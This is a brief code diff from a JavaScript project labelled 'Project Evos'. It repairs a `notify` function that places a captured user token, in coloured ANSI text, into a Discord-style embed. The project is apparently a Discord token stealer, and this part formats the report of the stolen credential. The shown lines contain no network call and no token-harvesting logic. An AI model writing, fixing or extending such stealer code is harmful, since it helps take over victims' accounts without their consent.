@@ -263,11 +263,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.embeds[0].fields.unshift({
         name: `Token:`,
-        fields: {
-            name: `Token:`,value: '```ansi\n' + `${boldpink}${token}`+ '\x1b[0m```' ,
-            name: "-",value: '```ansi\n' +`\x1b[1;30m⊰⊹═════⊹⊱≼Project Evos≽⊰⊹═════⊹⊱`+'\x1b[0m```',
-
-        },
+        value: '```ansi\n' + `${boldpink}${token}`+ '\x1b[0m```',
         inline: false
     })
 
